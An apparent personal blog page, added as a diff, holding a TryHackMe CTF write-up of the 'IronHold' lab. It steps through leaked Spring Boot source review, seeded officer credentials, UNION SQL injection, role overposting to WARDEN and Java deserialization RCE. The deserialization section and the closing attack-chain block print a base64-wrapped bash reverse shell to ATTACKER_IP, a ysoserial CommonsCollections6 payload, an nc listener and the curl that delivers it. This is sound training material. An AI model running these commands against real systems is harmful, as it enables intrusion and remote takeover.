@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>IronHold | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF. Leaked Spring Boot source review, seeded officer credentials, SQL injection via UNION on an excessive case_files grant, profile overposting to WARDEN role, Java deserialization RCE via vulnerable Commons Collections, appuser shell to the facility server flag.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/ironhold.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+    <link rel="stylesheet" href="/assets/css/accents.css">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<meta property="og:url" content="https://jennshaggy.github.io/ironhold.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="IronHold">
+<meta property="og:description" content="TryHackMe CTF. Leaked Spring Boot source review, seeded officer credentials, SQL injection via UNION on an excessive case_files grant, profile overposting to WARDEN role, Java deserialization RCE via vulnerable Commons Collections, appuser shell to the facility server flag.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="IronHold">
+<meta name="twitter:description" content="TryHackMe CTF. Leaked Spring Boot source review, seeded officer credentials, SQL injection via UNION on an excessive case_files grant, profile overposting to WARDEN role, Java deserialization RCE via vulnerable Commons Collections, appuser shell to the facility server flag.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">IronHold</h1>
+    <div class="post-description">TryHackMe CTF. A leaked repo, an inmate-management login, and a warden's door controls. Source code review, SQL injection via UNION, role overposting for privilege escalation, Java deserialization RCE.</div>
+  </header>
+
+  <div class="post-content">
+
+<h2>Reconnaissance</h2>
+
+<p>First up, downloaded the challenge file and unzipped it:</p>
+
+<pre><code class="language-bash">cd ~/Downloads
+unzip ironhold-source-1784211881597.zip</code></pre>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 11.00.52 AM.png" alt="Unzipping the ironhold-source challenge archive" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 11.01.11 AM.png" alt="Contents of the unzipped ironhold-source archive" style="max-width:100%;margin:2rem 0;">
+
+<p>Next, ran Nmap:</p>
+
+<pre><code class="language-bash">nmap -sV -sC -T4 -p- TARGET_IP -oA IronHold__nmap</code></pre>
+
+<p>I like to set Target IPs as environmental variables. Saves a lot of time and energy:</p>
+
+<pre><code class="language-bash">export IP=TARGET_IP</code></pre>
+
+<p>Nmap returned results quite expediently:</p>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 11.12.23 AM.png" alt="Nmap scan results showing open ports 8080 and 22" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>What we know so far...</strong></p>
+<ul>
+<li>We have the application's complete source.</li>
+<li>Open Port 8080/TCP runs Apache Tomcat and serves the IronHold staff-login app.</li>
+<li>Open Port 22/TCP runs OpenSSH on Ubuntu</li>
+</ul>
+
+<p>The Java repository files are database-access components. They read like separate repos, but they're not.</p>
+
+<p>The best finds in the bunch:</p>
+<ul>
+<li><code>DataSeeder.java</code>: Seeded accounts, records, and application data.</li>
+<li><code>AuthController.java</code>: Login handling.</li>
+<li><code>SessionUtil.java</code> and the interceptors: Authentication and authorization decisions.</li>
+<li><code>AdminController.java</code>: Staff records, diagnostics, and control-panel routes.</li>
+<li><code>ImportExportController.java</code>: Potentially dangerous file/import functionality.</li>
+<li><code>application.properties</code>: Database and application configuration.</li>
+</ul>
+
+<p>Next move: curled the login page and paid 8080 an in-browser visit:</p>
+
+<pre><code class="language-bash">curl -i "http://$IP:8080/"</code></pre>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 11.24.35 AM.png" alt="curl response from the IronHold login page on port 8080" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 11.25.31 AM.png" alt="IronHold staff login page in the browser on port 8080" style="max-width:100%;margin:2rem 0;">
+
+<p>On the 8080 login screen, hovering over <code>About the system</code> shows:<br>
+<code>http://TARGET_IP:8080/about;jsessionid=A4D23F44FA16D11D85DD72ABC192E2DB</code></p>
+
+<p>Hovering over <code>Service status</code> shows:<br>
+<code>http://TARGET_IP:8080/status;jsessionid=A4D23F44FA16D11D85DD72ABC192E2DB</code></p>
+
+<p>Confirmed a conventional server-rendered Java login:</p>
+<ul>
+<li><code>POST /login</code> takes <code>username</code> and <code>password</code>.</li>
+<li>Tomcat created an unauthenticated session using <code>JSESSIONID</code>.</li>
+<li><code>;jsessionid=...</code> hover URLs are Tomcat's URL-rewriting fallback. By themselves, they're no credential IDs.</li>
+<li><code>/about</code> and <code>/status</code> are handed to us in the hover-links, and become our next targets.</li>
+</ul>
+
+<pre><code class="language-bash">curl -i "http://$IP:8080/about"
+curl -i "http://$IP:8080/status"</code></pre>
+
+<p><code>/about</code>:</p>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 11.41.18 AM.png" alt="curl output from /about endpoint revealing kiosk credential hint" style="max-width:100%;margin:2rem 0;">
+
+<p><code>/status</code>:</p>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 11.42.04 AM.png" alt="curl output from /status endpoint showing actuator and legacy migration references" style="max-width:100%;margin:2rem 0;">
+
+<p>Near the bottom of the <code>/about</code> curl, it reads:</p>
+
+<pre><code>Kiosk terminals in the officers' station retain a shared service login for shift handover; do not use kiosk credentials for personal accounts.</code></pre>
+
+<p>That, my friends, is a cold-hard clue.</p>
+
+<p>We also have <code>/actuator</code> flirting with us at the bottom of <code>/status</code>. <code>Legacy data-migration service</code> is also making eyes at us. Especially since we have <code>ImportExportController.java</code> in the source.</p>
+
+<p>Probed the disclosed diagnostics root:</p>
+
+<pre><code class="language-bash">curl -i "http://$IP:8080/actuator"</code></pre>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 11.50.36 AM.png" alt="Actuator endpoint response showing overexposed internal routes" style="max-width:100%;margin:2rem 0;">
+
+<p>Before unpacking that, inspected how authentication works:</p>
+
+<pre><code class="language-bash">sed -n '1,240p' src/main/java/com/ironhold/controller/AuthController.java</code></pre>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 11.52.00 AM.png" alt="AuthController.java source showing login authentication flow" style="max-width:100%;margin:2rem 0;">
+
+<p><code>/actuator</code> is incredibly overexposed. We have route mappings, environment/configuration metadata, application components, and other internals without authentication. This correctional facility needs some correctional controls in place.</p>
+
+<p>The authentication controller was the obvious next step in the chain:</p>
+
+<pre><code>username → findByUsername() → stored Staff record
+password → PasswordEncoder.matches() → stored password</code></pre>
+
+<p>No visible controller-level bypass or raw SQL injection. The credentials are likely hiding in the weeds of seeded data or weakened by the password-encoder config.</p>
+
+<p>Source-checked <code>DataSeeder.java</code> and <code>PasswordConfig.java</code> next. Might turn up plaintext passwords, seeded kiosk or service usernames, that kind of thing.</p>
+
+<pre><code class="language-bash">sed -n '1,360p' src/main/java/com/ironhold/seed/DataSeeder.java</code></pre>
+
+<p>and</p>
+
+<pre><code class="language-bash">sed -n '1,200p' src/main/java/com/ironhold/config/PasswordConfig.java</code></pre>
+
+<p>Aha! Usable officer credentials in <code>DataSeeder.java</code>.</p>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 12.26.13 PM.png" alt="DataSeeder.java revealing seeded officer credentials in plaintext" style="max-width:100%;margin:2rem 0;">
+
+<p>Sorry, Officer Reyes. You just got pwned.</p>
+
+<p>That plaintext is BCrypt-encoded during startup, meaning cracking is unnecessary. The seeder also maps out the first 3 flag objectives, but I won't spoil the fun just yet.</p>
+
+<p><code>PasswordConfig.java</code></p>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 12.30.15 PM.png" alt="PasswordConfig.java showing BCrypt encoder configuration" style="max-width:100%;margin:2rem 0;">
+
+<p>Ran this to compact the seeder into a digestible evidence block:</p>
+
+<pre><code class="language-bash">rg -n -C 8 'fillerHash' src/main/java/com/ironhold/seed/DataSeeder.java</code></pre>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 12.32.06 PM.png" alt="ripgrep output confirming fillerHash usage and officer account seeding" style="max-width:100%;margin:2rem 0;">
+
+<p>The <code>rg</code> output and <code>PasswordConfig.java</code> prove the username, known password, and BCrypt processing. <code>j.reyes</code> turned up as an officer, <code>IronholdStaff2026!</code> got encoded once with BCrypt, and that hash got assigned to every listed officer account.</p>
+
+<p>Logged in as Officer Reyes:</p>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 12.36.36 PM.png" alt="Successful login as Officer Reyes on the IronHold staff portal" style="max-width:100%;margin:2rem 0;">
+
+<p>We're in. Thanks, Officer!</p>
+
+<h2>SQL Injection via UNION</h2>
+
+<p>In <code>DataSeeder.java</code>, there's an abhorrent bounty of private inmate information. Not good data to leave unsecured. It's a serious access-control/privacy design problem.</p>
+
+<p>That section of <code>DataSeeder.java</code> pointed to where flag 2 lived: <code>case_files</code>. It also showed the inmate-lookup database account had access to both <code>inmates</code> and <code>case_files</code>.</p>
+
+<p>Reconstructed the SQL query and its column structure for readability:</p>
+
+<pre><code class="language-bash">sed -n '1,300p' src/main/java/com/ironhold/controller/InmateController.java
+sed -n '1,240p' src/main/java/com/ironhold/config/DataAccessConfig.java</code></pre>
+
+<p>To funnel down what mattered from <code>InmateController.java</code> and <code>DataAccessConfig.java</code>:</p>
+
+<pre><code class="language-bash">nl -ba src/main/java/com/ironhold/config/DataAccessConfig.java | sed -n '10,52p'
+rg -n -C 4 'GRANT SELECT ON case_files|IA-2024-007' src/main/java/com/ironhold/seed/DataSeeder.java</code></pre>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 12.55.17 PM.png" alt="DataAccessConfig.java showing hardcoded lookup credentials and H2 database connection" style="max-width:100%;margin:2rem 0;">
+
+<p>Now the developers' security claim was clear: hardcoded lookup credentials, a connection to the shared H2 database, and use of the reduced-privilege account.</p>
+
+<p>Below: the lookup account had <code>SELECT</code> access to <code>case_files</code>, the hidden <code>IA-2024-007</code> record, and <code>flag2</code> sitting in that record's summary.</p>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 12.55.49 PM.png" alt="DataSeeder.java showing excessive SELECT grant on case_files and hidden IA-2024-007 record with flag2" style="max-width:100%;margin:2rem 0;">
+
+<p>Score.</p>
+
+<p>Didn't have remote DB access yet. Time to get it:</p>
+
+<pre><code class="language-bash">sed -n '1,300p' src/main/java/com/ironhold/controller/InmateController.java</code></pre>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 1.00.36 PM.png" alt="InmateController.java showing raw SQL concatenation with user input q" style="max-width:100%;margin:2rem 0;">
+
+<p>This showed <code>q</code> went straight into SQL instead of being passed as a parameter. Lots more there. Cleaned up the output:</p>
+
+<pre><code class="language-bash">nl -ba src/main/java/com/ironhold/controller/InmateController.java | sed -n '25,48p'</code></pre>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 1.02.12 PM.png" alt="Line-numbered InmateController.java showing injectable SQL concatenation" style="max-width:100%;margin:2rem 0;">
+
+<p>Also checked the same path in-browser to see how it played out:</p>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 1.03.33 PM.png" alt="In-browser inmate search showing the injectable search field" style="max-width:100%;margin:2rem 0;">
+
+<p><code>UNION</code> adopts the first query's output-column names, meaning the case-file title should appear where the inmate's name normally does.</p>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 1.05.20 PM.png" alt="UNION-based SQL injection returning the hidden flag from case_files" style="max-width:100%;margin:2rem 0;">
+
+<p>Or a flag appears. Either way, it works. Very considerate.</p>
+
+<p>Our chain so far:<br>
+SQL concatenation > UNION with three compatible columns > excessive SELECT permission on case_files > hidden record disclosed.</p>
+
+<h2>Privilege Escalation via Role Overposting</h2>
+
+<p>Onwards to the warden-only door-control panel.</p>
+
+<p>Before clicking around, worth understanding how the application enforces the role boundary:</p>
+
+<pre><code class="language-bash">sed -n '1,240p' src/main/java/com/ironhold/security/WardenInterceptor.java</code></pre>
+
+<p>And...</p>
+
+<pre><code class="language-bash">sed -n '1,260p' src/main/java/com/ironhold/config/WebMvcConfig.java</code></pre>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 2.01.14 PM.png" alt="WardenInterceptor.java source showing isWarden() role check on /admin paths" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 2.01.28 PM.png" alt="WebMvcConfig.java registering WardenInterceptor on /admin/** paths" style="max-width:100%;margin:2rem 0;">
+
+<p>This is starting to look a whole lot like credential disclosure and not like authorization bypass. The app takes the username from the server-side session, reloads that user from the database, checks the stored role with <code>isWarden()</code>, and protects <code>/admin/**</code>.</p>
+
+<p>Three separate hints pointed at a warden-password disclosure. Used curl with jq to test that:</p>
+
+<pre><code class="language-bash">curl -sS "http://$IP:8080/actuator/env/app.warden.password" | jq</code></pre>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 2.06.15 PM.png" alt="Actuator env endpoint confirming warden password property exists but value is sanitized" style="max-width:100%;margin:2rem 0;">
+
+<p>Well, this is a helpful negative result.</p>
+
+<p><code>/actuator/env</code> was publicly reachable. Confirmed the property existed, and where: <code>application.properties</code>. This result even identified <code>18:21</code>, aka line 18, column 21 inside the packaged config. Spring's sensitive-value sanitization blocked the password from view. Good thing there was a leaked, unredacted source archive sitting right there.</p>
+
+<p>Took a look at it:</p>
+
+<pre><code class="language-bash">nl -ba src/main/resources/application.properties | sed -n '1,80p'</code></pre>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 2.10.01 PM.png" alt="application.properties showing warden password bound to WARDEN_PASSWORD env var" style="max-width:100%;margin:2rem 0;">
+
+<p>The warden password lived in the runtime variable <code>WARDEN_PASSWORD</code>. Needed a different way to read that runtime value.</p>
+
+<p>Checked whether <code>IncidentController.java</code> could read arbitrary server files.</p>
+
+<pre><code class="language-bash">sed -n '1,300p' src/main/java/com/ironhold/controller/IncidentController.java</code></pre>
+
+<p>Nope. It rejects <code>..</code>.</p>
+
+<p>Tried <code>ProfileController.java</code>.</p>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 2.28.15 PM.png" alt="ProfileController.java showing @ModelAttribute Staff accepting user-supplied role field without authorization check" style="max-width:100%;margin:2rem 0;">
+
+<p>Aha! There's our priv-esc flaw.</p>
+
+<p><code>@ModelAttribute Staff</code> accepts a user-supplied <code>role</code>, and the controller saves it without checking authorization. Even if the profile doesn't show a <code>role</code> field, the backend still accepts one.</p>
+
+<p>The warden interceptor reloads our friend Officer Reyes from the database, meaning his role could get changed to <code>WARDEN</code> to elevate the session.</p>
+
+<p>Good job, Jenn.</p>
+
+<p>First, created a second Reyes browser session...</p>
+
+<pre><code class="language-bash">curl -sS -c /tmp/ironhold.cookies -o /dev/null -w '%{http_code}\n' \
+  -X POST "http://$IP:8080/login" \
+  --data-urlencode 'username=j.reyes' \
+  --data-urlencode 'password=IronholdStaff2026!'</code></pre>
+
+<p>...then overposted the hidden <code>role</code> field:</p>
+
+<pre><code class="language-bash">curl -sS -b /tmp/ironhold.cookies -o /dev/null -w '%{http_code}\n' \
+  -X POST "http://$IP:8080/profile/update" \
+  -d "fullName=Officer J. Reyes&amp;email=j.reyes@ironhold.example&amp;badgeNumber=O-104&amp;role=WARDEN"</code></pre>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 2.34.07 PM.png" alt="curl commands returning 302 for both login and role overpost confirming success" style="max-width:100%;margin:2rem 0;">
+
+<p>Wanted and got <code>302</code> for both.</p>
+
+<p>Refreshed the browser.</p>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 2.37.07 PM.png" alt="Browser showing Officer Reyes now elevated to WARDEN role" style="max-width:100%;margin:2rem 0;">
+
+<p>Hah! Reyes got pwned, promoted, and still called Officer.</p>
+
+<p>On <code>/admin/control</code>:</p>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 2.39.07 PM.png" alt="Warden door-control panel now accessible after role overposting" style="max-width:100%;margin:2rem 0;">
+
+<h2>Java Deserialization RCE</h2>
+
+<p>Only one flag left to find.</p>
+
+<p>Our goal: gain command execution on the server and read the final flag.</p>
+
+<p><code>sed</code> had been carrying this whole writeup. Used it again to inspect admin functionality:</p>
+
+<pre><code class="language-bash">sed -n '1,360p' src/main/java/com/ironhold/controller/AdminController.java</code></pre>
+
+<p>The controller came back not-injectable. It ran as an OS command:</p>
+
+<pre><code class="language-java">new ProcessBuilder("df", "-h", "/opt/ironhold")</code></pre>
+
+<p>All arguments were fixed. No user input reached the command. There's only one route left:</p>
+
+<pre><code class="language-bash">sed -n '1,360p' src/main/java/com/ironhold/controller/ImportExportController.java</code></pre>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 2.44.49 PM.png" alt="ImportExportController.java showing ois.readObject() deserializing attacker-controlled input" style="max-width:100%;margin:2rem 0;">
+
+<p>I think <code>ois.readObject();</code> is our server entry flaw.</p>
+
+<p>The application deserializes attacker-controlled Java objects. Before the application checks the restored object's type during <code>readObject()</code>, code inside a compatible dependency chain can execute.</p>
+
+<p>Which gadget libraries are available? Let's find out.</p>
+
+<pre><code class="language-bash">sed -n '1,260p' pom.xml</code></pre>
+
+<pre><code class="language-bash">sed -n '1,240p' src/main/java/com/ironhold/model/ImportManifest.java</code></pre>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 2.49.25 PM.png" alt="pom.xml showing commons-collections dependency with vulnerable version range" style="max-width:100%;margin:2rem 0;">
+
+<p>The <code>commons-collections</code> dependency range says it all. It intentionally allows the vulnerable Commons Collections versions used by Java deserialization gadget chains.</p>
+
+<p><code>ysoserial</code> is the go-to payload generator for this situation.</p>
+
+<p>Built the reverse shell to cross the finish line:</p>
+
+<pre><code class="language-bash">REV=$(printf '%s' 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1' | base64 -w0)</code></pre>
+
+<p>Base64-wrapped the payload:</p>
+
+<pre><code class="language-bash">java --add-opens=java.base/java.util=ALL-UNNAMED \
+  -jar ysoserial-all.jar CommonsCollections6 \
+  "bash -c {echo,$REV}|{base64,-d}|{bash,-i}" | base64 -w0 &gt; ironhold-payload.b64</code></pre>
+
+<p>A quick confirmation...</p>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 2.56.34 PM.png" alt="Confirming the ysoserial payload was generated and base64-encoded successfully" style="max-width:100%;margin:2rem 0;">
+
+<p>...and we're good.</p>
+
+<p>In a new terminal, started a listener on 4444:</p>
+
+<pre><code class="language-bash">nc -lvnp 4444</code></pre>
+
+<p>Sent the payload through the pwned, elevated Officer Reyes Warden session:</p>
+
+<pre><code class="language-bash">curl -i -b /tmp/ironhold.cookies -X POST "http://$IP:8080/admin/import" \
+  -H 'Content-Type: text/plain' --data-binary @ironhold-payload.b64</code></pre>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 2.58.47 PM.png" alt="curl sending the deserialization payload via the admin import endpoint" style="max-width:100%;margin:2rem 0;">
+
+<p>Drumroll...</p>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 2.59.05 PM.png" alt="Netcat listener catching the reverse shell from the IronHold server" style="max-width:100%;margin:2rem 0;">
+
+<p>Next:</p>
+
+<pre><code class="language-bash">id
+ls -la /</code></pre>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 3.00.26 PM.png" alt="id and ls output showing appuser inside a Docker container" style="max-width:100%;margin:2rem 0;">
+
+<p>Landed as <code>appuser</code>, inside a Docker container. No flag visible at <code>/</code>.</p>
+
+<p>The source pointed straight at <code>/opt/ironhold</code> for the final flag.</p>
+
+<pre><code class="language-bash">ls -la /opt/ironhold</code></pre>
+
+<p>And the source speaks truth:</p>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 3.02.09 PM.png" alt="ls -la /opt/ironhold showing flag.txt" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-bash">cat /opt/ironhold/flag.txt</code></pre>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 3.03.06 PM.png" alt="cat flag.txt revealing the final facility server flag" style="max-width:100%;margin:2rem 0;">
+
+<p>Fin.</p>
+
+<p><strong>Flags:</strong></p>
+
+<pre><code>THM{REDACTED}
+THM{REDACTED}
+THM{REDACTED}
+THM{REDACTED}</code></pre>
+
+<p>No root escalation required. The goal was the facility-server flag, and the compromised application account already had access.</p>
+
+<p>Pwned, promoted, serialized, finished.</p>
+
+<p>Cue the confetti...</p>
+
+<img src="/images/ironhold/Screenshot 2026-07-19 at 3.04.07 PM.png" alt="IronHold CTF completion confetti screen" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code># Recon
+nmap -sV -sC -T4 -p- TARGET_IP -oA IronHold__nmap
+export IP=TARGET_IP
+curl -i "http://$IP:8080/"
+curl -i "http://$IP:8080/about"
+curl -i "http://$IP:8080/status"
+curl -i "http://$IP:8080/actuator"
+
+# Source review found seeded officer creds
+# j.reyes / IronholdStaff2026!
+
+# Auth as officer
+curl -sS -c /tmp/ironhold.cookies -o /dev/null -w '%{http_code}\n' \
+  -X POST "http://$IP:8080/login" \
+  --data-urlencode 'username=j.reyes' \
+  --data-urlencode 'password=IronholdStaff2026!'
+
+# SQLi via UNION on inmate lookup surfaces flag 2 (case_files / IA-2024-007)
+
+# Overpost hidden role field to escalate to WARDEN
+curl -sS -b /tmp/ironhold.cookies -o /dev/null -w '%{http_code}\n' \
+  -X POST "http://$IP:8080/profile/update" \
+  -d "fullName=Officer J. Reyes&amp;email=j.reyes@ironhold.example&amp;badgeNumber=O-104&amp;role=WARDEN"
+
+# Insecure Java deserialization via ImportExportController (vulnerable Commons Collections)
+REV=$(printf '%s' 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1' | base64 -w0)
+java --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections6 \
+  "bash -c {echo,$REV}|{base64,-d}|{bash,-i}" | base64 -w0 &gt; ironhold-payload.b64
+
+nc -lvnp 4444
+
+curl -i -b /tmp/ironhold.cookies -X POST "http://$IP:8080/admin/import" \
+  -H 'Content-Type: text/plain' --data-binary @ironhold-payload.b64
+
+# Shell lands as appuser, final flag at /opt/ironhold/flag.txt
+cat /opt/ironhold/flag.txt  # flag redacted for publish</code></pre>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
